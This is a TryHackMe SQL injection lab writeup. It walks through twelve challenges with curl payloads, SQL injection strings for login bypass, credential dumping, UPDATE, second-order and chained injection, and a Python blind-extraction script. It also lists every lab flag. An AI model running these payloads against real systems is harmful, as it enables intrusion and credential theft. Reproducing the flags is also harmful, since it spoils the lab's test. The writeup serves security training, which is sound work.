# SQL Injection Lab — Writeup

> **Platform:** TryHackMe
> **Difficulty:** Easy-Hard (progressive challenges)
> **Date Completed:** 2026-02-25
> **Session File:** `sessions/2026-02-24-sqlilab/session.md`

## TL;DR

A hands-on SQL injection sandbox with 12 progressive challenges across two tracks. Track 1 teaches injection fundamentals (integer vs string, GET vs POST, client-side bypass, UPDATE statements). Track 2 simulates a real "Vulnerable Startup" app where you chain SQLi techniques to break authentication, dump credentials, perform blind injection, and exploit search/update functionality. All manual — no sqlmap.

---

## What We're Practicing

| Skill | Tier | What We Practiced |
|---|---|---|
| SQL Injection | Tier 1 | Manual injection: in-band, UNION-based, blind boolean, UPDATE/INSERT abuse |
| Authentication Bypasses | Tier 1 | Bypassing login forms via SQLi, dumping credential databases |
| Access Control Flaws | Tier 1 | Accessing admin accounts via injection and credential extraction |

---

## The Attack — Challenge by Challenge

### Track 1: Introduction to SQL Injection

---

### Challenge 1: Input Box Non-String (Easy)

**The concept:** The `profileID` parameter is used as an **integer** in the SQL query — no quotes around it. This means we can inject SQL directly without needing to escape a string.

**The vulnerable query:**
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password
FROM usertable WHERE profileID=10 AND password='ce5ca67...'
```

**The injection:**
```
profileID = 1 or 1=1-- -
```

**What this becomes:**
```sql
WHERE profileID=1 or 1=1-- - AND password='hash'
                        ^^^^ commented out — password check is gone
```

**Why it works:** `1=1` is always true, so the WHERE clause matches ALL rows. `-- -` is a SQL comment that kills the rest of the query (the password check). The app returns the first user and logs us in.

**The command:**
```bash
curl -s -c cookies.txt -L \
  "http://TARGET:5000/sesqli1/login?profileID=1%20or%201%3D1--%20-&password=a"
```

**Why `-- -` instead of just `--`?** MySQL requires a space after `--` for it to be treated as a comment. Using `-- -` ensures the space is there even after URL encoding (`--%20-`). This is a MySQL-specific quirk — PostgreSQL and others accept `--` alone.

**Flag:** `THM{dccea429d73d4a6b4f117ac64724f460}`

---

### Challenge 2: Input Box String (Easy)

**The difference:** Now `profileID` is wrapped in quotes — it's treated as a string.

```sql
WHERE profileID='10' AND password='hash'
```

**The injection:**
```
profileID = 1' or '1'='1'-- -
```

**What this becomes:**
```sql
WHERE profileID='1' or '1'='1'-- -' AND password='hash'
```

The first `'` closes the string that the developer opened. Then `or '1'='1'` is always true. Same result — bypasses login.

**The command:**
```bash
curl -s -c cookies.txt -L \
  "http://TARGET:5000/sesqli2/login?profileID=1%27%20or%20%271%27%3D%271%27--%20-&password=a"
```

**Key learning:** You must know whether the parameter is treated as a string or integer. If string — you need a quote `'` to break out. If integer — inject directly. Test both if unsure.

**Flag:** `THM{356e9de6016b9ac34e02df99a5f755ba}`

---

### Challenge 3: URL Injection (Easy)

**The twist:** Same vulnerability as Challenge 2, but the login form has **client-side JavaScript validation** that blocks special characters:

```javascript
if (/^[a-zA-Z0-9]*$/.test(profileID) == false) {
    alert("The input fields cannot contain special characters");
    return false;
}
```

**Why this doesn't matter:** Client-side validation runs in YOUR browser. You control the browser. The server has no idea whether the JavaScript ran or not. Three ways to bypass:

1. **Go directly to the URL** (what we did) — skip the form entirely
2. **Intercept with Burp Suite** — submit the form, catch the request in Burp Proxy, modify it before it reaches the server
3. **Disable JavaScript** in browser dev tools

**The command:**
```bash
curl -s -c cookies.txt -L \
  "http://TARGET:5000/sesqli3/login?profileID=-1%27%20or%201%3D1--%20-&password=a"
```

**Bug bounty lesson:** NEVER trust client-side validation as a security boundary. In bug bounty, always test by sending requests directly (curl, Burp Repeater). If a form blocks special characters in the browser, that's a UI feature, not security. Always test the server directly.

**Flag:** `THM{645eab5d34f81981f5705de54e8a9c36}`

---

### Challenge 4: POST Injection (Easy)

**The twist:** Same vulnerability, same client-side validation, but the form uses **POST** instead of GET. You can't just modify the URL — you need to send a POST request body.

**The command:**
```bash
# Send the injection via POST body
curl -s -c cookies.txt -X POST \
  -d "profileID=-1' or 1=1-- -&password=a" \
  "http://TARGET:5000/sesqli4/login"

# Grab the flag from the home page using the session cookie
curl -s -b cookies.txt "http://TARGET:5000/sesqli4/home"
```

**Why POST matters:** GET parameters are visible in the URL, logs, and browser history. POST parameters are in the request body. But from an injection perspective, the vulnerability is identical — the server concatenates the input into SQL regardless of how it arrived. In Burp Suite, you'd intercept the POST request in Proxy, send it to Repeater, and modify the profileID parameter there.

**Flag:** `THM{727334fd0f0ea1b836a8d443f09dc8eb}`

---

### Challenge 5: UPDATE Statement (Easy)

**The shift:** The login form is now **safe** — it uses parameterized queries (`WHERE profileID=? AND password=?`). The injection is in the **Edit Profile** page's UPDATE statement instead.

**Step 1 — Login with valid credentials:**
```bash
curl -s -c cookies.txt -X POST \
  -d "profileID=10&password=toor" \
  "http://TARGET:5000/sesqli5/login"
```

**Step 2 — Find the vulnerable UPDATE:**

The Edit Profile form has `nickName`, `email`, and `password` fields. The backend query:
```sql
UPDATE usertable SET nickName='INPUT', email='INPUT', password='HASH' WHERE UID='1'
```

The `nickName` field is concatenated directly — injectable.

**Step 3 — Enumerate the database through injection:**

The technique: inject into `nickName` to close the quote early, then set `email` to a subquery that extracts data. The extracted data appears in the email field on the home page.

```bash
# Enumerate tables
curl -s -b cookies.txt -X POST "http://TARGET:5000/sesqli5/profile" \
  -d "nickName=x',email=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%')-- -&email=x&password=x"
# Result in email field: "usertable,secrets"

# Enumerate columns in secrets table
curl -s -b cookies.txt -X POST "http://TARGET:5000/sesqli5/profile" \
  -d "nickName=x',email=(SELECT group_concat(name) FROM pragma_table_info('secrets'))-- -&email=x&password=x"
# Result: "id,author,secret"

# Extract the flag
curl -s -b cookies.txt -X POST "http://TARGET:5000/sesqli5/profile" \
  -d "nickName=x',email=(SELECT group_concat(secret) FROM secrets)-- -&email=x&password=x"
```

**The injection anatomy:**
```sql
-- What the server builds:
UPDATE usertable SET nickName='x',email=(SELECT group_concat(secret) FROM secrets)-- -',email='x',password='hash' WHERE UID='1'
                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                         Our subquery replaces the email value
                                                                              ^^^^
                                                                              Comments out the rest
```

**Why this matters for bug bounty:** UPDATE injection is dangerous because it **modifies data**. On a real target you could:
- Change another user's password (account takeover)
- Escalate your own privileges (set role='admin')
- Exfiltrate data through visible fields (exactly what we did)
- Delete data

Any "edit profile", "update settings", or "change password" form is a potential UPDATE injection target.

**Flag:** `THM{b3a540515dbd9847c29cffa1bef1edfb}`

---

### Track 2: Vulnerable Startup

*These challenges simulate a real web application with progressive hardening. Each challenge patches the previous vulnerability and introduces a new attack surface.*

---

### Challenge 6: Broken Authentication (Easy)

**Goal:** Bypass the login form to retrieve the flag.

**The setup:** A simple login form with `username` and `password` fields. The query:
```sql
SELECT id, username FROM users WHERE username='INPUT' AND password='INPUT'
```

**The injection:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' or 1=1-- -&password=a" \
  "http://TARGET:5000/challenge1/login"

curl -s -b cookies.txt "http://TARGET:5000/challenge1/home"
```

**What happens:** The `'` closes the username string, `or 1=1` makes the condition always true, `-- -` comments out the password check. The app logs us in as the first user in the database.

**This is the most basic auth bypass in existence** — and it still works in the real world. Any login form that concatenates user input into SQL without parameterization is vulnerable. In bug bounty, test every login form with `' or 1=1-- -` as a first check.

**Flag:** `THM{f35f47dcd9d596f0d3860d14cd4c68ec}`

---

### Challenge 7: Broken Authentication 2 — UNION Credential Dump (Medium)

**Goal:** Dump all passwords from the database to retrieve the flag. No blind injection — UNION-based only.

**The setup:** Same login form, same query structure:
```sql
SELECT id, username FROM users WHERE username='INPUT' AND password='INPUT'
```

The app shows "Logged in as USERNAME" after login — the `username` column from the query result is displayed on the page. This is our exfiltration channel.

**The technique — UNION SELECT:**

UNION combines results from two SELECT statements. The key rules:
1. Both SELECTs must return the **same number of columns**
2. The data types should be compatible
3. Our injected SELECT can query ANY table

Since the original query returns 2 columns (`id, username`), our UNION must also return 2 columns.

**Step 1 — Confirm UNION works:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' UNION SELECT 1,'test'-- -&password=a" \
  "http://TARGET:5000/challenge2/login"

curl -s -b cookies.txt "http://TARGET:5000/challenge2/home" | grep "Logged in"
# Result: "Logged in as test"
```

The app takes whatever is in column 2 of the result and uses it as the session username. We control what goes there.

**Step 2 — Extract a single password:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' UNION SELECT 1,password FROM users WHERE username='admin'-- -&password=a" \
  "http://TARGET:5000/challenge2/login"

curl -s -b cookies.txt "http://TARGET:5000/challenge2/home" | grep "Logged in"
# Result: "Logged in as rcLYWHCxeGUsA9tH3GNV"
```

Admin's password (`rcLYWHCxeGUsA9tH3GNV`) appears as the "username" on the page. We used the password column's value to replace what gets displayed.

**Step 3 — Dump ALL credentials at once:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' UNION SELECT 1,group_concat(username||':'||password,';') FROM users-- -&password=a" \
  "http://TARGET:5000/challenge2/login"

curl -s -b cookies.txt "http://TARGET:5000/challenge2/home" | grep "Logged in"
```

**Result:**
```
Logged in as admin:rcLYWHCxeGUsA9tH3GNV;dev:asd;amanda:Summer2019!;maja:345m3io4hj3;awe32Flage32x:THM{fb381dfee71ef9c31b93625ad540c9fa};emil:viking123
```

**The injection anatomy:**
```sql
-- What the server builds:
SELECT id, username FROM users WHERE username = ''
UNION SELECT 1,group_concat(username||':'||password,';') FROM users-- -'
AND password = 'a'

-- First SELECT: WHERE username = '' → returns 0 rows (empty string matches nobody)
-- UNION SELECT: returns 1 row with ALL usernames:passwords concatenated
-- The app uses this single row's "username" value (the concat string) for the session
-- "Logged in as [entire credential dump]" appears on the page
```

**Why `group_concat` is powerful:**
- `group_concat(X, separator)` merges all rows into one string
- `username||':'||password` concatenates columns with `:` between them (SQLite string concat)
- Result: `user1:pass1;user2:pass2;...` — every credential in one shot

**Credentials dumped:**

| Username | Password |
|---|---|
| admin | rcLYWHCxeGUsA9tH3GNV |
| dev | asd |
| amanda | Summer2019! |
| maja | 345m3io4hj3 |
| awe32Flage32x | THM{fb381dfee71ef9c31b93625ad540c9fa} |
| emil | viking123 |

**Bug bounty relevance:** UNION-based SQLi is the gold standard for data exfiltration. In real targets:
- Any page that displays query results (search results, user profiles, product listings) is a potential UNION channel
- You need to match column count exactly — use `ORDER BY` incrementing (`ORDER BY 1`, `ORDER BY 2`, ...) until you get an error to find the count
- `group_concat` (MySQL/SQLite) or `string_agg` (PostgreSQL) lets you dump entire tables in one request
- Passwords stored in plaintext (like here) = instant account takeover. Even hashed passwords can often be cracked offline.

**Flag:** `THM{fb381dfee71ef9c31b93625ad540c9fa}`

---

### Challenge 8: Broken Authentication 3 — Blind Boolean Injection (Medium)

**Goal:** The UNION technique from Challenge 7 no longer works — the app doesn't display the username or leak data through cookies. We must extract the admin's password using **blind boolean injection** — asking the database yes/no questions one character at a time.

**The concept:** Blind SQLi means you get NO direct output from the database. Instead, you infer data from the application's **behavior**:
- **302 redirect** = TRUE (the condition we injected was true → login succeeds)
- **200 OK** = FALSE (condition false → stays on login page with "Invalid username or password")

**Step 1 — Confirm boolean control:**
```bash
# TRUE test: Is the first character 'T' (hex 0x54)?
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -d "username=admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -&password=a" \
  "http://TARGET:5000/challenge3/login"
# Result: 302 (TRUE — first char IS 'T')

# FALSE test: Is the first character 'A' (hex 0x41)?
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -d "username=admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'41' as Text)-- -&password=a" \
  "http://TARGET:5000/challenge3/login"
# Result: 200 (FALSE — first char is NOT 'A')
```

**Why CAST(X'54' as Text)?** The app converts usernames to lowercase. If we compared with `= 'T'`, the app would lowercase it to `'t'` and the comparison would fail for uppercase characters. Using hex representation `X'54'` with CAST bypasses the lowercasing — hex values aren't affected by string transformations.

**Step 2 — Find password length:**
```bash
# Ask: is the password length 37?
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -d "username=admin' AND length((SELECT password FROM users WHERE username='admin'))==37-- -&password=a" \
  "http://TARGET:5000/challenge3/login"
# Result: 302 (TRUE — password is 37 characters, matching THM{32-char-hash} format)
```

**Step 3 — The injection anatomy:**
```sql
-- Our input in the username field:
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -

-- What the server builds:
SELECT id, username FROM users
WHERE username = 'admin'
AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -'
AND password = 'hash'

-- Breaking it down:
-- 1. username = 'admin'         → matches the admin user
-- 2. AND SUBSTR(...)            → our boolean test (is char at position X equal to Y?)
-- 3. -- -                        → comments out the password check
-- Both conditions must be TRUE for the query to return a row → 302 redirect
```

**Key SQLite functions used:**
- `SUBSTR(string, start, length)` — extract one character at a position
- `UNICODE(char)` — get the ASCII code of a character (for comparison operators like `>`)
- `LENGTH(string)` — get string length
- `LIMIT offset, count` — select which row (0 = first user = admin)

**Step 4 — The extraction script (binary search):**

The naive approach tests every printable ASCII character (95 possibilities) for each position = 95 × 37 = 3,515 requests. **Binary search** cuts this to ~7 requests per character = ~259 total.

```python
#!/usr/bin/env python3
"""Blind Boolean SQLi extractor using binary search."""
import requests, sys

TARGET = "http://TARGET:5000/challenge3/login"
PASSWORD_LEN = 37
password = ""

for pos in range(1, PASSWORD_LEN + 1):
    low, high = 32, 126  # printable ASCII range

    while low <= high:
        mid = (low + high) // 2
        # Ask: is the ASCII value of char at position > mid?
        payload = (
            f"admin' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 0,1),"
            f"{pos},1)) > {mid}-- -"
        )
        r = requests.post(TARGET, data={"username": payload, "password": "a"},
                         allow_redirects=False)

        if r.status_code == 302:  # TRUE — char > mid
            low = mid + 1
        else:                      # FALSE — char <= mid
            high = mid - 1

    password += chr(low)
    sys.stdout.write(f"\r[{pos}/{PASSWORD_LEN}] {password}")
    sys.stdout.flush()

print(f"\n\nPassword: {password}")
```

**How binary search works here:**
1. For each character position, we know the ASCII value is between 32–126
2. We ask: "Is the char's ASCII code > 79?" (midpoint)
   - TRUE → it's in range 80–126
   - FALSE → it's in range 32–79
3. We halve the range each time until we find the exact value
4. ~7 comparisons per character vs ~95 for brute force

**Script output (ran in ~15 seconds):**
```
[1/37] T
[2/37] TH
[3/37] THM
...
[37/37] THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
```

**Why this matters for bug bounty:**
- Blind SQLi is the most common form you'll encounter — apps rarely display raw query results
- **Any behavioral difference** can be an oracle: HTTP status, response time, page content length, error messages, redirect vs no redirect
- Always script it — manual blind injection is impractical beyond proof-of-concept
- Binary search or bitwise extraction are essential for efficiency — some WAFs rate-limit requests
- sqlmap automates this (`sqlmap --technique=b`), but understanding the manual technique is critical for:
  - Writing custom scripts when sqlmap fails (WAF evasion, unusual response patterns)
  - Explaining findings in bug bounty reports
  - Interviews and certifications (CEH, OSCP)

**Flag:** `THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}`

---

### Challenge 9: Vulnerable Notes — Second-Order Injection (Hard)

**Goal:** The login form is now safe (parameterized queries). A new "Notes" feature has been added. Find the vulnerability and dump the database.

**The concept — Second-Order (Stored) SQL Injection:**

This is a two-stage attack:
1. **Stage 1 (Storage):** We inject a malicious payload that gets safely stored in the database — the INSERT uses parameterized queries, so no injection happens during registration
2. **Stage 2 (Trigger):** When the app later USES our stored data in an unsafe query, the injection fires

The registration (safe — parameterized):
```sql
INSERT INTO users (username, password) VALUES (?, ?)  -- Our payload is just data here
```

The notes page (VULNERABLE — concatenation):
```sql
SELECT title, note FROM notes WHERE username = '' union select 1,group_concat(password) from users''
                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                   Our "username" IS the injection
```

**Step 1 — Register a user whose name IS the SQL injection:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' union select 1,group_concat(password) from users'&password=asd" \
  "http://TARGET:5000/challenge4/signup"
```

The username `' union select 1,group_concat(password) from users'` is stored safely in the database. The parameterized INSERT treats it as a string — no injection yet.

**Step 2 — Login as the malicious user:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=' union select 1,group_concat(password) from users'&password=asd" \
  "http://TARGET:5000/challenge4/login"
```

Login also uses parameterized queries — still safe. But now we have a session.

**Step 3 — Visit the notes page (TRIGGER):**
```bash
curl -s -b cookies.txt "http://TARGET:5000/challenge4/notes"
```

When the notes page loads, the backend runs:
```sql
SELECT title, note FROM notes WHERE username = '' union select 1,group_concat(password) from users''
```

**What happens:**
1. `WHERE username = ''` — matches no notes (empty string)
2. `UNION SELECT 1, group_concat(password) FROM users` — appends a row with ALL passwords
3. The passwords appear as a "note" on the page

**Result displayed as a note:**
```
rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{4644c7e157fd5498e7e4026c89650814},viking123,asd
```

**The key insight — why the trailing quote matters:**

Our username: `' union select 1,group_concat(password) from users'`

The first `'` closes the opening quote in the WHERE clause. The last `'` closes the trailing quote that the developer's code adds. No `-- -` comment needed — we match the quotes perfectly:
```sql
WHERE username = ''  union select 1,group_concat(password) from users  ''
                ^^                                                     ^^
                Our ' closes    Normal empty string — evaluates to     Dev's closing '
                the dev's '     nothing and doesn't break the query    matched by our '
```

**Why this is dangerous in the real world:**

Second-order injection bypasses most input validation because:
- The injection point (registration) IS safe — parameterized queries, WAFs see nothing malicious
- The vulnerability is in a DIFFERENT function (notes page) that trusts data already in the database
- Developers assume "if it's in our database, it's been validated" — this assumption is WRONG
- Automated scanners (including basic sqlmap usage) often miss this because the injection and trigger are on different endpoints

**Bug bounty targets:**
- Any feature that stores user input and later uses it in queries: display names, profile fields, search history, saved filters, email addresses
- Multi-step workflows where data from step 1 is used in step 3
- Admin panels that display user-submitted data (admin viewing user profiles, support tickets)
- Export/report features that query stored user data

**Flag:** `THM{4644c7e157fd5498e7e4026c89650814}`

---

### Challenge 10: Change Password — UPDATE Injection via Stored Username (Medium)

**Goal:** The notes vulnerability is fixed. A new "Change Password" feature is added. The UPDATE query concatenates the username (fetched from the database, not directly from user input) into the query. Exploit it to take over the admin account.

**The vulnerability:** The developer assumed that data from the database is safe — it's not user input, right? Wrong. We control what goes INTO the database (via registration), and the app later uses it unsafely:

```sql
-- Safe: password comes from user input, uses placeholder
-- UNSAFE: username comes from DB but is concatenated directly
UPDATE users SET password = ? WHERE username = '" + username + "'
```

**The attack — 4 steps to account takeover:**

**Step 1 — Register as `admin'-- -`:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=admin'-- -&password=oldpass" \
  "http://TARGET:5000/challenge5/signup"
```

The registration uses parameterized queries — our malicious username is stored safely as the literal string `admin'-- -`.

**Step 2 — Login as `admin'-- -`:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=admin'-- -&password=oldpass" \
  "http://TARGET:5000/challenge5/login"
```

**Step 3 — Change password (TRIGGER):**
```bash
curl -s -b cookies.txt -X POST \
  -d "current-password=oldpass&password=hacked&password2=hacked" \
  "http://TARGET:5000/challenge5/changepwd"
```

The app fetches our username from the DB (`admin'-- -`) and builds:
```sql
UPDATE users SET password = 'new_hash' WHERE username = 'admin'-- -'
                                                        ^^^^^  ^^^^
                                                        Real   Comment kills
                                                        admin  the rest
```

Instead of updating OUR account (`admin'-- -`), it updates the REAL `admin` account.

**Step 4 — Login as admin with our new password:**
```bash
curl -s -c cookies.txt -X POST \
  -d "username=admin&password=hacked" \
  "http://TARGET:5000/challenge5/login"

curl -s -b cookies.txt "http://TARGET:5000/challenge5/home"
# Flag displayed on admin's home page
```

**Why this is the same class as Challenge 9:**

Both are **second-order injection** — the payload is stored safely, then triggered later by a different function. The difference:
- Challenge 9: stored username triggers in a SELECT (data exfiltration)
- Challenge 10: stored username triggers in an UPDATE (account takeover)

**The developer's mistake:** Trusting data from the database. The thought process was: "The username comes from our database, not from user input, so it's safe." But the USER controlled what went INTO the database. **Every query that uses dynamic data must use parameterized queries — regardless of where the data comes from.**

**Bug bounty relevance — Account Takeover (ATO):**
- This is a **Critical** severity finding ($5,000-$25,000+)
- Account takeover = you can reset any user's password by registering a crafted username
- Look for this pattern in: password reset flows, profile update endpoints, any feature that uses stored usernames/emails in queries
- The "trusted internal data" assumption is extremely common in production code

**Flag:** `THM{cd5c4f197d708fda06979f13d8081013}`

---

### Challenge 11: Book Title — UNION Injection in Search (Easy)

**Goal:** A new book search feature has been added. The search query concatenates user input directly. Find the flag via UNION injection.

**The vulnerable query:**
```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like 'INPUT%')
```

User input goes into a LIKE clause inside a subquery. The `%` is a wildcard appended server-side.

**Step 1 — Break out and confirm injection:**

The input is inside `'...'` inside `(...)`. We need to close both:
```
') or 1=1-- -
```

This becomes:
```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '') or 1=1-- -%')
```
The `')` closes the string AND the subquery parenthesis. `or 1=1` matches all books. `-- -` kills the rest. Result: all books dumped.

**Step 2 — Find column count with UNION:**
```bash
# Try: ') union select 1,2,3,4-- -
curl -s -b cookies.txt \
  "http://TARGET:5000/challenge6/book?title=')%20union%20select%201,2,3,4--%20-"
```

Result shows: Title=2, Description=3, Author=4. So the table has 4 columns: `id, title, description, author`. Columns 2-4 are displayed on the page — all three are exfiltration channels.

**Step 3 — Enumerate tables:**
```bash
curl -s -b cookies.txt \
  "http://TARGET:5000/challenge6/book?title=') union select 1,group_concat(tbl_name),3,4 from sqlite_master where type='table' and tbl_name not like 'sqlite_%'-- -"
# Result: "users,notes,books"
```

**Step 4 — Dump credentials:**
```bash
curl -s -b cookies.txt \
  "http://TARGET:5000/challenge6/book?title=') union select 1,group_concat(username||':'||password,';'),3,4 from users-- -"
```

**Result:**
```
admin:THM{27f8f7ce3c05ca8d6553bc5948a89210};dev:asd;amanda:Summer2019!;maja:345m3io4hj3;emil:viking123
```

**The injection anatomy:**
```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '')
union select 1,group_concat(username||':'||password,';'),3,4 from users-- -%')
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Subquery returns nothing (empty title match)
UNION appends our crafted row with all credentials
Columns 2-4 appear as Title/Description/Author on the page
```

**Bug bounty relevance:**
- Search functions are prime SQLi targets — they almost always feed user input into queries
- The nested subquery pattern (`WHERE id = (SELECT...)`) is common in apps that do two-step lookups
- LIKE clauses with `%` wildcards are a tell that the parameter might be injectable
- Test by appending `'` to search terms and watching for errors or behavioral changes

**Flag:** `THM{27f8f7ce3c05ca8d6553bc5948a89210}`

---

### Challenge 12: Book Title 2 — Chained (Two-Stage) Injection (Hard)

**Goal:** The book search now uses TWO queries — query 1 gets the book ID, query 2 fetches the book details using that ID. Both concatenate unsafely. Exploit the chain to extract the flag WITHOUT blind injection.

**The two queries:**
```python
# Query 1: gets book ID from title search
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)

# Query 2: gets full book details using the ID from query 1
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

**The chain attack concept:**

We don't inject directly into query 2 — we inject into query 1 so that its RESULT becomes an injection payload for query 2.

```
┌─ Query 1 ─────────────────────────────────────┐
│ SELECT id FROM books WHERE title like '{INPUT}%' │
│ We UNION SELECT a malicious string as the "id"   │
│ Result: "-1'union select 1,2,3,4 from users-- -" │
└──────────────────────┬─────────────────────────┘
                       │ (result feeds into query 2)
                       ▼
┌─ Query 2 ──────────────────────────────────────────────────┐
│ SELECT * FROM books WHERE id = '-1'union select 1,2,3,4-- -│
│ The quote in our result CLOSES the id string               │
│ UNION SELECT extracts whatever we want                     │
└────────────────────────────────────────────────────────────┘
```

**The payload:**
```
' union select '-1''union select 1,group_concat(username||'':''||password,'';''),3,4 from users-- -
```

**Breaking down the escaping (this is the tricky part):**

Our input goes into query 1's LIKE clause. We need the RESULT of query 1 to contain single quotes (for injecting into query 2). But single quotes inside a SQL string must be escaped by doubling them (`''`).

```sql
-- Query 1 with our input:
SELECT id FROM books WHERE title like '' union select '-1''union select 1,group_concat(...),3,4 from users-- -%'
                                        ^              ^^^^                                      ^^^^
                                        |              Escaped ' (becomes literal ')              Comments out %'
                                        Empty LIKE (matches nothing)

-- What query 1 RETURNS as the "id" value:
-1'union select 1,group_concat(username||':'||password,';'),3,4 from users-- -

-- Query 2 with that result:
SELECT * FROM books WHERE id = '-1'union select 1,group_concat(username||':'||password,';'),3,4 from users-- -%'
                                ^^^                                                            ^^^^
                                '-1' = no match                                                Comments out trailing %'
```

The `''` inside the UNION string in query 1 is SQLite's escape for a literal quote. When the result is returned, it contains an actual `'` character. When query 2 naively concatenates this result, that `'` closes the string and our UNION takes over.

**The command:**
```bash
PAYLOAD="' union select '-1''union select 1,group_concat(username||'':''||password,'';''),3,4 from users-- -"
curl -s -b cookies.txt "http://TARGET:5000/challenge7/book?title=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")"
```

**Result displayed as book title:**
```
admin:THM{183526c1843c09809695a9979a672f09};dev:asd;amanda:Summer2019!;maja:345m3io4hj3;emil:viking123
```

**Why this is the hardest challenge in the room:**

1. **Two-stage thinking:** You must reason about what query 1 returns AND how query 2 uses it
2. **Quote escaping:** The `''` double-quote escape is essential — without it, the string terminates too early in query 1 and the syntax breaks
3. **No blind injection needed:** The room hints at blind being possible on query 1, but chaining through query 2 gives us UNION-based extraction — faster, cleaner, fewer requests
4. **Real-world parallel:** This pattern appears in any app that uses multi-step lookups: "get ID first, then fetch details." If either step concatenates, the chain is exploitable.

**Bug bounty relevance:**
- Multi-step queries are everywhere: search → detail view, list → item page, API lookups that resolve slugs to IDs
- Even if the first query's output isn't directly visible, if it feeds into a second query that IS visible, you can chain them
- This is why parameterized queries must be used EVERYWHERE — not just on "user-facing" queries

**Flag:** `THM{183526c1843c09809695a9979a672f09}`

---

## Flags Summary

| # | Challenge | Type | Flag |
|---|---|---|---|
| 1 | Input Box Non-String | Integer injection | `THM{dccea429d73d4a6b4f117ac64724f460}` |
| 2 | Input Box String | String injection | `THM{356e9de6016b9ac34e02df99a5f755ba}` |
| 3 | URL Injection | Client-side bypass | `THM{645eab5d34f81981f5705de54e8a9c36}` |
| 4 | POST Injection | POST body injection | `THM{727334fd0f0ea1b836a8d443f09dc8eb}` |
| 5 | UPDATE Statement | UPDATE subquery extraction | `THM{b3a540515dbd9847c29cffa1bef1edfb}` |
| 6 | Broken Authentication | Auth bypass `' or 1=1-- -` | `THM{f35f47dcd9d596f0d3860d14cd4c68ec}` |
| 7 | Broken Authentication 2 | UNION-based credential dump | `THM{fb381dfee71ef9c31b93625ad540c9fa}` |
| 8 | Broken Authentication 3 | Blind boolean injection (binary search) | `THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}` |
| 9 | Vulnerable Notes | Second-order (stored) injection | `THM{4644c7e157fd5498e7e4026c89650814}` |
| 10 | Change Password | UPDATE injection via stored username | `THM{cd5c4f197d708fda06979f13d8081013}` |
| 11 | Book Title | UNION injection in search | `THM{27f8f7ce3c05ca8d6553bc5948a89210}` |
| 12 | Book Title 2 | Chained (two-stage) injection | `THM{183526c1843c09809695a9979a672f09}` |

---

## Tools Used

| Tool | Purpose | Why This Tool |
|---|---|---|
| **curl** | HTTP requests with full control over method, headers, cookies, parameters | For SQLi testing you need to control exactly what's sent. curl gives you that without a GUI. |
| **Burp Suite** | (Should be used) Proxy + Repeater for intercepting and modifying requests | The professional way to do this — intercept in Proxy, send to Repeater, modify and resend. We used curl for speed but Burp is the real-world workflow. |
| **grep** | Extract flags and data from responses | Quick pattern matching on command output |

---

## Bug Bounty Relevance

- **Would this work on a real target?** SQL injection is still found in production applications — especially in legacy code, internal tools, and applications built by developers without security training. OWASP consistently ranks injection in the top 10.

- **Where to look in bug bounty:**
  - Login forms (always test first)
  - Search functionality
  - Profile edit / settings pages (UPDATE injection)
  - Any parameter that filters or sorts data
  - API endpoints that accept user input for database queries
  - URL parameters, POST bodies, HTTP headers (User-Agent, Referer, Cookie values)

- **Bounty potential:** SQLi → data extraction = High-Critical ($2,000-$25,000+). SQLi → auth bypass = Critical. Even error-based SQLi that confirms vulnerability without data extraction is typically Medium-High.

---

## Lessons Learned

1. **Know your injection context.** Integer vs string, GET vs POST, SELECT vs UPDATE vs INSERT — the injection technique changes based on how the input is used in the query. Always identify the query structure first.

2. **Client-side validation is not security.** JavaScript regex, HTML5 form validation, disabled buttons — none of these stop an attacker who sends requests directly with curl or Burp.

3. **UNION is your best friend for data extraction.** Match the column count, find which columns are displayed, and use `group_concat` to dump entire tables in one shot. Always try UNION before falling back to blind.

4. **Blind injection is slow but universal.** When there's no visible output, behavioral differences (302 vs 200, response time, page content length) become your oracle. Binary search makes it practical (~7 requests per character vs ~95 for brute force).

5. **Never trust data from the database.** Second-order injection (Challenges 9-10) exploits the assumption that "if it's in our database, it's safe." Registration stores the payload, a different function triggers it. This bypasses WAFs and input validation at the entry point.

6. **Parameterized queries must be used EVERYWHERE.** Not just on "user-facing" queries. Any query that uses dynamic data — even data from your own database — must use placeholders. One missed query in a chain breaks everything.

7. **Multi-step queries create chain opportunities.** When query 1's result feeds into query 2 (Challenge 12), you can craft query 1's output to be a payload that exploits query 2. Think about data flow, not just individual queries.

